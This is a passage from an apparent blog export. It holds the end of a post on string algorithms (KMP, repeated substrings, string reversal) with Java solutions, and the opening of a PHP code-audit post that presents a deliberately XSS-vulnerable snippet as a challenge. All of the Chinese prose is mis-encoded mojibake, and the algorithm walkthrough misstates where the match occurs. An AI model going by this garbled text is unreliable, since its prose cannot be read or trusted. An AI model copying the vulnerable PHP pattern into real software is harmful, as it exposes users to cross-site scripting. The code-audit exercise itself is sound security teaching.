class="headerlink" title="æš´åŠ›è§£æ³•"></a>æš´åŠ›è§£æ³•</h3><p>æš´åŠ›çš„è§£æ³•ï¼Œ å°±æ˜¯ä¸€ä¸ªforå¾ªç¯è·å– å­ä¸²çš„ç»ˆæ­¢ä½ç½®ï¼Œ ç„¶ååˆ¤æ–­å­ä¸²æ˜¯å¦èƒ½é‡å¤æ„æˆå­—ç¬¦ä¸²ï¼ŒåˆåµŒå¥—ä¸€ä¸ªforå¾ªç¯ï¼Œæ‰€ä»¥æ˜¯O(n^2)çš„æ—¶é—´å¤æ‚åº¦ã€‚<br>æœ‰çš„åŒå­¦å¯ä»¥æƒ³ï¼Œæ€ä¹ˆä¸€ä¸ªforå¾ªç¯å°±å¯ä»¥è·å–å­ä¸²å—ï¼Ÿ è‡³å°‘å¾—ä¸€ä¸ªforè·å–å­ä¸²èµ·å§‹ä½ç½®ï¼Œä¸€ä¸ªforè·å–å­ä¸²ç»“æŸä½ç½®å§ã€‚<br>å…¶å®æˆ‘ä»¬åªéœ€è¦åˆ¤æ–­ï¼Œä»¥ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºå¼€å§‹çš„å­ä¸²å°±å¯ä»¥ï¼Œæ‰€ä»¥ä¸€ä¸ªforå¾ªç¯è·å–å­ä¸²çš„ç»ˆæ­¢ä½ç½®å°±è¡Œäº†ã€‚ è€Œä¸”éå†çš„æ—¶å€™ éƒ½ä¸ç”¨éå†ç»“æŸï¼Œ<strong>åªéœ€è¦éå†åˆ°ä¸­é—´ä½ç½®</strong>ï¼Œå› ä¸ºå­ä¸²ç»“æŸä½ç½®å¤§äºä¸­é—´ä½ç½®çš„è¯ï¼Œä¸€å®šä¸èƒ½é‡å¤ç»„æˆå­—ç¬¦ä¸²ã€‚</p><h3 id="ç»“åˆKMPè§£æ³•"><a href="#ç»“åˆKMPè§£æ³•" class="headerlink" title="ç»“åˆKMPè§£æ³•"></a>ç»“åˆKMPè§£æ³•</h3><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå­—ç¬¦ä¸² <code>s = &quot;abcabc&quot;</code>ï¼Œæˆ‘ä»¬æƒ³è¦åˆ¤æ–­è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç”±ä¸€ä¸ªæ›´çŸ­çš„å­ä¸²é€šè¿‡é‡å¤ç»„æˆçš„ã€‚</p><ol><li>ç¬¬ä¸€æ­¥ï¼šç†è§£å­—ç¬¦ä¸²é‡å¤çš„åŸºæœ¬æ¦‚å¿µ<br> å¦‚æœå­—ç¬¦ä¸² <code>s</code> ç”±é‡å¤çš„å­ä¸²ç»„æˆï¼Œæ¯”å¦‚ <code>s = &quot;abcabc&quot;</code> å¯ä»¥çœ‹ä½œæ˜¯ <code>&quot;abc&quot;</code> é‡å¤äº†ä¸¤æ¬¡ã€‚è¿™å°±æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬å¯¹ <code>s</code> è¿›è¡Œä¸€å®šçš„æ“ä½œï¼Œåº”è¯¥èƒ½å¤Ÿä»ä¸­å‘ç°é‡å¤çš„æ¨¡å¼ã€‚</li><li>ç¬¬äºŒæ­¥ï¼šæ„é€ æ–°å­—ç¬¦ä¸²<br> ä¸ºäº†æ¢ç´¢è¿™ç§å¯èƒ½çš„é‡å¤æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å°†å­—ç¬¦ä¸² <code>s</code> å¤åˆ¶å¹¶æ‹¼æ¥è‡ªèº«ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸² <code>t = s + s</code>ï¼Œå³ <code>t = &quot;abcabcabcabc&quot;</code>ã€‚</li><li>ç¬¬ä¸‰æ­¥ï¼šå»é™¤é¦–å°¾å­—ç¬¦<br> æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å»æ‰ <code>t</code> çš„é¦–å°¾å­—ç¬¦ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æˆ‘ä»¬ä»…ä»…æ˜¯åœ¨æ–°å­—ç¬¦ä¸²çš„å¼€å§‹æˆ–ç»“æŸå¤„æ‰¾åˆ°åŸå§‹çš„ <code>s</code>ã€‚å»æ‰é¦–å°¾å­—ç¬¦åï¼Œ<code>t</code> å˜æˆ <code>&quot;bcabcabcab&quot;</code>ã€‚</li><li>ç¬¬å››æ­¥ï¼šæœç´¢åŸå§‹å­—ç¬¦ä¸²<br> ç°åœ¨ï¼Œå¦‚æœåœ¨å¤„ç†åçš„å­—ç¬¦ä¸² <code>t</code> ä¸­ä»ç„¶èƒ½æ‰¾åˆ°åŸå§‹çš„å­—ç¬¦ä¸² <code>s</code>ï¼Œè¿™è¡¨æ˜ <code>s</code> ç¡®å®æ˜¯ç”±é‡å¤çš„å­ä¸²ç»„æˆçš„ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œ<code>&quot;abcabc&quot;</code> ç¡®å®å‡ºç°åœ¨ <code>&quot;bcabcabcab&quot;</code> ä¸­ï¼Œä»ç´¢å¼• 1 åˆ° 6ã€‚</li><li>ç¬¬äº”æ­¥ï¼šç†è§£KMPç®—æ³•çš„åº”ç”¨<br> åœ¨å®é™…çš„ç®—æ³•å®ç°ä¸­ï¼Œä¸ºäº†æé«˜æœç´¢çš„æ•ˆç‡ï¼Œå¯ä»¥ä½¿ç”¨ KMP ç®—æ³•ã€‚KMP ç®—æ³•é€šè¿‡é¢„è®¡ç®—ä¸€ä¸ªæ‰€è°“çš„â€éƒ¨åˆ†åŒ¹é…è¡¨â€ï¼ˆä¹Ÿç§°ä¸º next æ•°ç»„ï¼‰ï¼Œæ¥ä¼˜åŒ–æœç´¢è¿‡ç¨‹ã€‚è¿™ä¸ªæ•°ç»„å¸®åŠ©ç®—æ³•åœ¨ä¸åŒ¹é…æ—¶ï¼Œè·³è¿‡æ— éœ€æ¯”è¾ƒçš„éƒ¨åˆ†ã€‚</li><li>ç¬¬å…­æ­¥ï¼šä»£ç å®ç°å’Œå¤æ‚åº¦åˆ†æ<br> åœ¨ä»£ç å®ç°ä¸­ï¼Œè¿™ä¸ªåŸç†å¯ä»¥ç®€å•åœ°é€šè¿‡æ£€æŸ¥ <code>t.find(s) != std::string::npos</code> æ¥å®ç°ï¼Œå³æ£€æŸ¥ <code>s</code> æ˜¯å¦ä½œä¸ºå­ä¸²å­˜åœ¨äº <code>t</code> ä¸­ã€‚è¿™ç§æ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦é€šå¸¸ä¸º O(n)ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(1)ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">repeatedSubstringPattern</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(s.equals(<span class="string">&quot;&quot;</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŸä¸²åŠ ä¸ªç©ºæ ¼ï¼Œä½¿ä¸‹æ ‡ä»1å¼€å§‹ï¼Œè¿™æ ·jä»0å¼€å§‹ï¼Œä¹Ÿä¸ç”¨åˆå§‹åŒ–äº†</span></span><br><span class="line">        s = <span class="string">&quot; &quot;</span> + s;</span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[len + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ nextæ•°ç»„ï¼Œjä»0å¼€å§‹ï¼Œiä»2å¼€å§‹</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= len; i++)&#123;</span><br><span class="line">            <span class="comment">// åŒ¹é…ä¸æˆåŠŸï¼Œjå›åˆ°å‰ä¸€ä½ç½®nextæ•°ç»„å¯¹åº”çš„å€¼</span></span><br><span class="line">            <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; chars[i] != chars[j+<span class="number">1</span>]) j = next[j];</span><br><span class="line">            <span class="comment">// åŒ¹é…æˆåŠŸï¼Œjåç§»</span></span><br><span class="line">            <span class="keyword">if</span>(chars[i] == chars[j + <span class="number">1</span>]) j++;</span><br><span class="line">            <span class="comment">// æ›´æ–°nextæ•°ç»„çš„å€¼</span></span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(next[len] &gt; <span class="number">0</span> &amp;&amp; len % (len - next[len]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²ï¼šæ€»ç»“ç¯‡"><a href="#å­—ç¬¦ä¸²ï¼šæ€»ç»“ç¯‡" class="headerlink" title="å­—ç¬¦ä¸²ï¼šæ€»ç»“ç¯‡"></a>å­—ç¬¦ä¸²ï¼šæ€»ç»“ç¯‡</h2><h3 id="åŒæŒ‡é’ˆæ³•"><a href="#åŒæŒ‡é’ˆæ³•" class="headerlink" title="åŒæŒ‡é’ˆæ³•"></a>åŒæŒ‡é’ˆæ³•</h3><p>åœ¨344.åè½¬å­—ç¬¦ä¸² (opens new window)ï¼Œæˆ‘ä»¬ä½¿ç”¨åŒæŒ‡é’ˆæ³•å®ç°äº†åè½¬å­—ç¬¦ä¸²çš„æ“ä½œï¼ŒåŒæŒ‡é’ˆæ³•åœ¨æ•°ç»„ï¼Œé“¾è¡¨å’Œå­—ç¬¦ä¸²ä¸­å¾ˆå¸¸ç”¨ã€‚<br>æ¥ç€åœ¨å­—ç¬¦ä¸²ï¼šæ›¿æ¢ç©ºæ ¼ (opens new window)ï¼ŒåŒæ ·è¿˜æ˜¯ä½¿ç”¨åŒæŒ‡é’ˆæ³•åœ¨æ—¶é—´å¤æ‚åº¦O(n)çš„æƒ…å†µä¸‹å®Œæˆæ›¿æ¢ç©ºæ ¼ã€‚<br>å…¶å®å¾ˆå¤šæ•°ç»„å¡«å……ç±»çš„é—®é¢˜ï¼Œéƒ½å¯ä»¥å…ˆé¢„å…ˆç»™æ•°ç»„æ‰©å®¹å¸¦å¡«å……åçš„å¤§å°ï¼Œç„¶ååœ¨ä»åå‘å‰è¿›è¡Œæ“ä½œã€‚<br>é‚£ä¹ˆé’ˆå¯¹æ•°ç»„åˆ é™¤æ“ä½œçš„é—®é¢˜ï¼Œå…¶å®åœ¨27. ç§»é™¤å…ƒç´  (opens new window)ä¸­å°±å·²ç»æåˆ°äº†ä½¿ç”¨åŒæŒ‡é’ˆæ³•è¿›è¡Œç§»é™¤æ“ä½œã€‚<br>åŒæ ·çš„é“ç†åœ¨151.ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ (opens new window)ä¸­æˆ‘ä»¬ä½¿ç”¨O(n)çš„æ—¶é—´å¤æ‚åº¦ï¼Œå®Œæˆäº†åˆ é™¤å†—ä½™ç©ºæ ¼ã€‚<br>ä¸€äº›åŒå­¦ä¼šä½¿ç”¨forå¾ªç¯é‡Œè°ƒç”¨åº“å‡½æ•°eraseæ¥ç§»é™¤å…ƒç´ ï¼Œè¿™å…¶å®æ˜¯O(n^2)çš„æ“ä½œï¼Œå› ä¸ºeraseå°±æ˜¯O(n)çš„æ“ä½œï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯å…¸å‹çš„ä¸çŸ¥é“åº“å‡½æ•°çš„æ—¶é—´å¤æ‚åº¦ï¼Œä¸Šæ¥å°±ç”¨çš„æ¡ˆä¾‹äº†ã€‚</p><h3 id="åè½¬ç³»åˆ—"><a href="#åè½¬ç³»åˆ—" class="headerlink" title="åè½¬ç³»åˆ—"></a>åè½¬ç³»åˆ—</h3><p>åœ¨åè½¬ä¸Šè¿˜å¯ä»¥åœ¨åŠ ä¸€äº›ç©æ³•ï¼Œå…¶å®è€ƒå¯Ÿçš„æ˜¯å¯¹ä»£ç çš„æŒæ§èƒ½åŠ›ã€‚<br>541.åè½¬å­—ç¬¦ä¸²II (opens new window)ä¸­ï¼Œä¸€äº›åŒå­¦å¯èƒ½ä¸ºäº†å¤„ç†é€»è¾‘ï¼šæ¯éš”2kä¸ªå­—ç¬¦çš„å‰kçš„å­—ç¬¦ï¼Œå†™äº†ä¸€å †é€»è¾‘ä»£ç æˆ–è€…å†æä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¥ç»Ÿè®¡2kï¼Œå†ç»Ÿè®¡å‰kä¸ªå­—ç¬¦ã€‚<br>å…¶å®å½“éœ€è¦å›ºå®šè§„å¾‹ä¸€æ®µä¸€æ®µå»å¤„ç†å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¦æƒ³æƒ³åœ¨åœ¨forå¾ªç¯çš„è¡¨è¾¾å¼ä¸Šåšåšæ–‡ç« ã€‚<br>åªè¦è®© i +&#x3D; (2 * k)ï¼Œi æ¯æ¬¡ç§»åŠ¨ 2 * k å°±å¯ä»¥äº†ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦éœ€è¦æœ‰åè½¬çš„åŒºé—´ã€‚<br>å› ä¸ºè¦æ‰¾çš„ä¹Ÿå°±æ˜¯æ¯2 * k åŒºé—´çš„èµ·ç‚¹ï¼Œè¿™æ ·å†™ç¨‹åºä¼šé«˜æ•ˆå¾ˆå¤šã€‚<br>åœ¨151.ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ (opens new window)ä¸­è¦æ±‚ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ï¼Œè¿™é“é¢˜ç›®å¯ä»¥è¯´æ˜¯ç»¼åˆè€ƒå¯Ÿäº†å­—ç¬¦ä¸²çš„å¤šç§æ“ä½œã€‚æ˜¯è€ƒå¯Ÿå­—ç¬¦ä¸²çš„å¥½é¢˜ã€‚<br>è¿™é“é¢˜ç›®é€šè¿‡ å…ˆæ•´ä½“åè½¬å†å±€éƒ¨åè½¬ï¼Œå®ç°äº†åè½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯ã€‚<br>åæ¥å‘ç°åè½¬å­—ç¬¦ä¸²è¿˜æœ‰ä¸€ä¸ªç‰›é€¼çš„ç”¨å¤„ï¼Œå°±æ˜¯è¾¾åˆ°å·¦æ—‹çš„æ•ˆæœã€‚<br>åœ¨å­—ç¬¦ä¸²ï¼šåè½¬ä¸ªå­—ç¬¦ä¸²è¿˜æœ‰è¿™ä¸ªç”¨å¤„ï¼Ÿ (opens new window)ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡å…ˆå±€éƒ¨åè½¬å†æ•´ä½“åè½¬è¾¾åˆ°äº†å·¦æ—‹çš„æ•ˆæœã€‚</p><h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><p>KMPçš„ä¸»è¦æ€æƒ³æ˜¯å½“å‡ºç°å­—ç¬¦ä¸²ä¸åŒ¹é…æ—¶ï¼Œå¯ä»¥çŸ¥é“ä¸€éƒ¨åˆ†ä¹‹å‰å·²ç»åŒ¹é…çš„æ–‡æœ¬å†…å®¹ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯é¿å…ä»å¤´å†å»åšåŒ¹é…äº†ã€‚<br>KMPçš„ç²¾é«“æ‰€åœ¨å°±æ˜¯å‰ç¼€è¡¨ï¼Œåœ¨KMPç²¾è®² (opens new window)ä¸­æåˆ°äº†ï¼Œä»€ä¹ˆæ˜¯KMPï¼Œä»€ä¹ˆæ˜¯å‰ç¼€è¡¨ï¼Œä»¥åŠä¸ºä»€ä¹ˆè¦ç”¨å‰ç¼€è¡¨ã€‚<br>å‰ç¼€è¡¨ï¼šèµ·å§‹ä½ç½®åˆ°ä¸‹æ ‡iä¹‹å‰ï¼ˆåŒ…æ‹¬iï¼‰çš„å­ä¸²ä¸­ï¼Œæœ‰å¤šå¤§é•¿åº¦çš„ç›¸åŒå‰ç¼€åç¼€ã€‚<br>é‚£ä¹ˆä½¿ç”¨KMPå¯ä»¥è§£å†³ä¸¤ç±»ç»å…¸é—®é¢˜ï¼š<br>åŒ¹é…é—®é¢˜ï¼š28. å®ç° strStr()(opens new window)<br>é‡å¤å­ä¸²é—®é¢˜ï¼š459.é‡å¤çš„å­å­—ç¬¦ä¸²(opens new window)<br>å†ä¸€æ¬¡å¼ºè°ƒäº†ä»€ä¹ˆæ˜¯å‰ç¼€ï¼Œä»€ä¹ˆæ˜¯åç¼€ï¼Œä»€ä¹ˆåˆæ˜¯æœ€é•¿ç›¸ç­‰å‰åç¼€ã€‚<br>å‰ç¼€ï¼šæŒ‡ä¸åŒ…å«æœ€åä¸€ä¸ªå­—ç¬¦çš„æ‰€æœ‰ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å¤´çš„è¿ç»­å­ä¸²ã€‚<br>åç¼€ï¼šæŒ‡ä¸åŒ…å«ç¬¬ä¸€ä¸ªå­—ç¬¦çš„æ‰€æœ‰ä»¥æœ€åä¸€ä¸ªå­—ç¬¦ç»“å°¾çš„è¿ç»­å­ä¸²ã€‚<br>ç„¶åé’ˆå¯¹å‰ç¼€è¡¨åˆ°åº•è¦ä¸è¦å‡ä¸€ï¼Œè¿™å…¶å®æ˜¯ä¸åŒKMPå®ç°çš„æ–¹å¼ï¼Œæˆ‘ä»¬åœ¨KMPç²¾è®² (opens new window)ä¸­é’ˆå¯¹ä¹‹å‰ä¸¤ä¸ªé—®é¢˜ï¼Œåˆ†åˆ«ç»™å‡ºäº†ä¸¤ä¸ªä¸åŒç‰ˆæœ¬çš„çš„KMPå®ç°ã€‚<br>å…¶ä¸­ä¸»è¦ç†è§£j&#x3D;next[x]è¿™ä¸€æ­¥æœ€ä¸ºå…³é”®ï¼</p><h3 id="å¸¸è§ç®—æ³•æ€è·¯ä¸å®ç°"><a href="#å¸¸è§ç®—æ³•æ€è·¯ä¸å®ç°" class="headerlink" title="å¸¸è§ç®—æ³•æ€è·¯ä¸å®ç°"></a>å¸¸è§ç®—æ³•æ€è·¯ä¸å®ç°</h3><ol><li><p><strong>å­—ç¬¦ä¸²åè½¬</strong> (<code>344. åè½¬å­—ç¬¦ä¸²</code>)</p><ul><li>ä½¿ç”¨åŒæŒ‡é’ˆæ³•æ¥åŸåœ°åè½¬å­—ç¬¦ä¸²ï¼Œè¿™ç§æ–¹æ³•æ—¶é—´å¤æ‚åº¦ä¸º O(n)ï¼Œç©ºé—´å¤æ‚åº¦ä¸º O(1)ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = s.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s[left];</span><br><span class="line">        s[left++] = s[right];</span><br><span class="line">        s[right--] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å±€éƒ¨å­—ç¬¦ä¸²åè½¬</strong> (<code>541. åè½¬å­—ç¬¦ä¸² II</code>)</p><ul><li>å¯¹ç‰¹å®šçš„å­ä¸²è¿›è¡Œåè½¬ï¼Œå¯ç”¨äºåŠ å¯†ã€æ–‡æœ¬å¤„ç†ç­‰åœºæ™¯ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] a = s.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>; start &lt; a.length; start += <span class="number">2</span> * k) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start, j = Math.min(start + k - <span class="number">1</span>, a.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> a[i];</span><br><span class="line">            a[i++] = a[j];</span><br><span class="line">            a[j--] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å­—ç¬¦ä¸²ä¸­çš„å•è¯ç¿»è½¬</strong> (<code>151. ç¿»è½¬å­—ç¬¦ä¸²é‡Œçš„å•è¯</code>)</p><ul><li>å…ˆç§»é™¤å¤šä½™ç©ºæ ¼ï¼Œå†æ•´ä½“åè½¬å­—ç¬¦ä¸²ï¼Œæœ€ååè½¬æ¯ä¸ªå•è¯ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    s = s.trim(); <span class="comment">// å»æ‰é¦–å°¾ç©ºæ ¼</span></span><br><span class="line">    String[] words = s.split(<span class="string">&quot;\\s+&quot;</span>); <span class="comment">// æ­£åˆ™åŒ¹é…è¿ç»­ç©ºæ ¼</span></span><br><span class="line">    Collections.reverse(Arrays.asList(words));</span><br><span class="line">    <span class="keyword">return</span> String.join(<span class="string">&quot; &quot;</span>, words);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>KMPç®—æ³•</strong> (<code>28. å®ç° strStr()</code>)</p><ul><li>KMP æ˜¯ç”¨äºå­—ç¬¦ä¸²æœç´¢çš„é«˜æ•ˆç®—æ³•ï¼Œé€šè¿‡è®¡ç®—â€œéƒ¨åˆ†åŒ¹é…â€è¡¨æ¥å‡å°‘æ¯”è¾ƒæ¬¡æ•°ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (needle.isEmpty()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] lps = computeLPSArray(needle);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; haystack.length()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (haystack.charAt(i) == needle.charAt(j)) &#123;</span><br><span class="line">            i++; j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == needle.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - j;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; haystack.length() &amp;&amp; haystack.charAt(i) != needle.charAt(j)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j != <span class="number">0</span>) j = lps[j - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æ›¿æ¢æ•°å­—ä¸ºå­—ç¬¦ä¸²</strong> (<code>è‡ªå®šä¹‰é¢˜ç›®</code>)</p><ul><li>é’ˆå¯¹å­—ç¬¦ä¸²ä¸­çš„æ•°å­—å­—ç¬¦è¿›è¡Œç‰¹å®šå­—ç¬¦ä¸²çš„æ›¿æ¢ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replaceDigits</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Character.isDigit(c)) sb.append(<span class="string">&quot;number&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> sb.append(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­—ç¬¦ä¸² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘PHPä»£ç å®¡è®¡4</title>
      <link href="/2024/10/15/WebSecurity/codeaudit/phpaudit4/"/>
      <url>/2024/10/15/WebSecurity/codeaudit/phpaudit4/</url>
      
        <content type="html"><![CDATA[<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sanitized</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$sanitized</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$queryParts</span> = <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$key</span>, <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span> . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$value</span>;</span><br><span class="line">&#125;, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$sanitized</span>), <span class="title function_ invoke__">array_values</span>(<span class="variable">$sanitized</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="variable">$queryParts</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;/images/size.php?&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$query</span>) . <span class="string">&quot;&#x27;&gt;link&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´è§£æ</strong> ï¼š<br>æ ¹æ®é¢˜ç›®æ„æ€ï¼Œè¿™é‡Œè€ƒå¯Ÿçš„åº”è¯¥æ˜¯ä¸ª <strong>xssæ¼æ´</strong> ï¼Œ 